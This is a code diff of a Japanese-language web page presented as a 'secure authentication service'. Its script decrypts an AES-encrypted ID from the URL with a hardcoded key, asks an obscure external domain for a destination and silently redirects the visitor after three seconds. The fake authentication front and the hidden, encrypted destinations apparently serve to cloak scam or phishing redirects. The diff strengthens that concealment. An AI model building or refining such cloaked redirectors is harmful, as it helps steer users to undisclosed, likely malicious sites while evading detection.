@@ -20,31 +20,33 @@
   <p class="caption">セキュア認証サービス</p>
 
   <script>
-    const AES_KEY = "5Ctianyoumabiiii";
-    const id = location.pathname.split("/").pop();
+    const AES_KEY = "5Ctianyoumabiiii"; // 必须与你后端一致（16 字节）
+    
+    const path = location.pathname.split("/").filter(Boolean);
+    const encryptedId = path[path.length - 1];
 
-    if (!id) {
-      document.body.innerHTML = "<h3>無効なIDです</h3>";
+    if (!encryptedId) {
+      document.body.innerHTML += '<p style="color:red;">ID が見つかりません。</p>';
     } else {
-      fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(id))
-        .then(r => r.json())
-        .then(data => {
-          const enc = data?.data?.siteUrl;
-          if (enc) {
-            decryptAES(enc).then(url => {
-              if (url) {
-                setTimeout(() => location.href = url, 3000);
+      decryptAES(encryptedId).then(realId => {
+        if (realId) {
+          fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(realId))
+            .then(r => r.json())
+            .then(data => {
+              const final = data?.data?.siteUrl;
+              if (final) {
+                setTimeout(() => location.href = final, 3000);
               } else {
-                document.body.innerHTML += "<p>復号に失敗しました。</p>";
+                document.body.innerHTML += '<p style="color:red;">リダイレクト先が見つかりません。</p>';
               }
+            })
+            .catch(() => {
+              document.body.innerHTML += '<p style="color:red;">APIエラーが発生しました。</p>';
             });
-          } else {
-            document.body.innerHTML += "<p>IDが存在しません。</p>";
-          }
-        })
-        .catch(() => {
-          document.body.innerHTML += "<p>サーバーエラーが発生しました。</p>";
-        });
+        } else {
+          document.body.innerHTML += '<p style="color:red;">ID復号に失敗しました。</p>';
+        }
+      });
     }
 
     async function decryptAES(encText) {
